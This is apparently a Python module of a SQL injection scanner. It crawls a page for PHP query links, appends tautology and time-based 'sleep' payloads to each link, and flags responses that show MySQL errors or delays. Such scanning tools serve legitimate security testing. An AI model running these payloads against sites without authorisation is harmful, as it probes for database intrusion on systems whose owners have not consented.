import requests
import time
from bs4 import BeautifulSoup
from ...config import Config
from messages import SuccessMessages, ErrorMessages
from ...handler.logger.log import log_data_to_file
from ...handler.errors import TimeoutRequest
from ...handler.retry.retryrequest import RetryRequest

payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "' OR '1'='1' #", "' OR '1'='1' /*"]
blind_payloads = [" AND sleep(3)", " OR sleep(3)"]
vulnerable_links = []
retry_request = RetryRequest(max_retries=3)

CONFIG = Config()

def find_php_links(url) -> None:
    response = retry_request.retry(requests.get, url, timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()})
    soup = BeautifulSoup(response.text, 'html.parser')
    php_links = [a['href'] for a in soup.find_all('a', href=True) if '.php?' in a['href']]
    for links in php_links:
        if test_sql_injection(links):
            print(f"{SuccessMessages.FOUND_SQL_INJECTION}{test_sql_injection(links)}")
        else:
            print(f"{ErrorMessages.NO_SQL_INJECTION_CONTENT}{links}")


def test_sql_injection(url):
    for payload in payloads:
        response = retry_request.retry(requests.get, url + payload, timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()})
        if 'mysql_fetch_array()' in response.text or 'You have an error in your SQL syntax;' in response.text:
            vulnerable_links.append(url)
    for blind_payload in blind_payloads:
        start_time = time.time()
        response = requests.get(url + blind_payload)
        end_time = time.time()
        if end_time - start_time > 3:
            vulnerable_links.append(url)
    return vulnerable_links
